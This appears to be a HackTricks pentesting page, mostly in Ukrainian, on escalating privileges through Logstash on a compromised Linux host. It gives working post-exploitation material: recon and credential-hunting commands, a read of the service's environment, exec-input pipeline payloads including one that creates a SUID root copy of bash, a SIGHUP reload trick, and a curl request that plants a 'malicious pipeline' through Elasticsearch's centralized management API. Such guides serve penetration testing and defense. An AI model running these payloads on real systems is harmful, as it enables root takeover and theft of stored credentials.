# Logstash Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash використовується для **збирання, перетворення та відправлення логів** через систему, відому як **pipelines**. Ці **pipelines** складаються зі стадій **input**, **filter** та **output**. Цікавий аспект виникає, коли Logstash працює на скомпрометованій машині.

### Конфігурація Pipeline

Конфігурації pipeline задаються у файлі **/etc/logstash/pipelines.yml**, який містить список шляхів до конфігурацій pipeline:
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
This file reveals where the **.conf** files, containing pipeline configurations, are located. When employing an **Elasticsearch output module**, it's common for **pipelines** to include **Elasticsearch credentials**, which often possess extensive privileges due to Logstash's need to write data to Elasticsearch. Wildcards in configuration paths allow Logstash to execute all matching pipelines in the designated directory.

If Logstash is started with `-f <directory>` instead of `pipelines.yml`, **all files inside that directory are concatenated in lexicographical order and parsed as a single config**. This creates 2 offensive implications:

- Підкинутий файл на кшталт `000-input.conf` або `zzz-output.conf` може змінити, як фінальний pipeline збирається
- Неправильно сформований файл може завадити завантаженню всього pipeline, тож ретельно перевіряйте payloads перед тим, як покладатися на auto-reload

### Швидка розвідка на скомпрометованому хості

На машині, де встановлено Logstash, швидко перевірте:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Також перевірте, чи доступний локальний API моніторингу. За замовчуванням він прив'язується до **127.0.0.1:9600**, що зазвичай достатньо після отримання доступу до хоста:
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Зазвичай це дає вам pipeline IDs, деталі виконання та підтвердження, що ваш змінений pipeline було завантажено.

Облікові дані, отримані з Logstash, часто відкривають доступ до **Elasticsearch**, тому перегляньте [цю сторінку про Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Privilege Escalation via Writable Pipelines

Щоб спробувати privilege escalation, спочатку визначте користувача, від імені якого працює служба Logstash, зазвичай це користувач **logstash**. Переконайтеся, що ви відповідаєте **одній** з цих вимог:

- Маєте **права запису** до файлу pipeline **.conf** **або**
- Файл **/etc/logstash/pipelines.yml** використовує wildcard, і ви можете записувати в цільову папку

Додатково, повинна бути виконана **одна** з цих умов:

- Можливість перезапустити службу Logstash **або**
- Файл **/etc/logstash/logstash.yml** має встановленим **config.reload.automatic: true**

За наявності wildcard у конфігурації, створення файлу, який відповідає цьому wildcard, дозволяє виконувати команди. Наприклад:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Тут **interval** визначає частоту виконання в секундах. У наведеному прикладі команда **whoami** виконується кожні 120 секунд, а її вивід спрямовується в **/tmp/output.log**.

При встановленому **config.reload.automatic: true** у **/etc/logstash/logstash.yml**, Logstash автоматично виявляє та застосовує нові або змінені конфігурації pipeline без перезапуску. Якщо немає wildcard, зміни все ще можна вносити в існуючі конфігурації, але слід бути обережним, щоб уникнути збоїв.

### Більш надійні Pipeline Payloads

Вхідний плагін `exec` все ще працює в актуальних релізах і вимагає або `interval`, або `schedule`. Він виконується шляхом **forking** Logstash JVM, тому якщо пам'яті мало, ваш payload може завершитися з `ENOMEM` замість того, щоб виконатися непомітно.

Більш практичний privilege-escalation payload зазвичай — це такий, який залишає стійкий артефакт:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
Якщо у вас немає прав на перезапуск, але ви можете посилати сигнал процесу, Logstash також підтримує перезавантаження, ініційоване **SIGHUP**, у Unix-подібних системах:
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Be aware that not every plugin is reload-friendly. For example, the **stdin** input prevents automatic reload, so don't assume `config.reload.automatic` will always pick up your changes.

### Викрадення секретів з Logstash

Перед тим як зосереджуватися лише на виконанні коду, зберіть дані, до яких Logstash вже має доступ:

- Облікові дані у відкритому тексті часто захардкожені всередині `elasticsearch {}` outputs, `http_poller`, JDBC inputs, або cloud-related settings
- Безпечні налаштування можуть зберігатися в **`/etc/logstash/logstash.keystore`** або в іншому каталозі `path.settings`
- Пароль keystore часто передається через **`LOGSTASH_KEYSTORE_PASS`**, а пакункові інсталяції зазвичай підхоплюють його з **`/etc/sysconfig/logstash`**
- Розширення змінних середовища з `${VAR}` вирішується під час запуску Logstash, тож має сенс перевірити середовище служби

Корисні перевірки:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
Це також варто перевірити, оскільки **CVE-2023-46672** показала, що Logstash може фіксувати конфіденційну інформацію в логах за певних обставин. На хості після постексплуатації старі логи Logstash та записи `journald` можуть розкрити облікові дані навіть якщо поточна конфігурація посилається на keystore замість зберігання секретів inline.

### Зловживання централізованим керуванням pipeline

В деяких середовищах хост зовсім не покладається на локальні файли `.conf`. Якщо **`xpack.management.enabled: true`** налаштовано, Logstash може завантажувати централізовано керовані pipelines з Elasticsearch/Kibana, і після увімкнення цього режиму локальні конфіги pipeline більше не є джерелом істини.

Це означає інший вектор атаки:

1. Отримати облікові дані Elastic з локальних налаштувань Logstash, keystore або логів
2. Перевірити, чи має акаунт кластерну привілегію **`manage_logstash_pipelines`**
3. Створити або замінити централізовано керований pipeline так, щоб хост Logstash виконав ваш payload при наступному опитуванні

The Elasticsearch API used for this feature is:
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
Це особливо корисно, коли локальні файли доступні лише для читання, але Logstash вже зареєстрований для віддаленого отримання pipelines.

## Посилання

- [Elastic Docs: Reloading the Config File](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [Elastic Docs: Configure Centralized Pipeline Management](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)

{{#include ../../banners/hacktricks-training.md}}
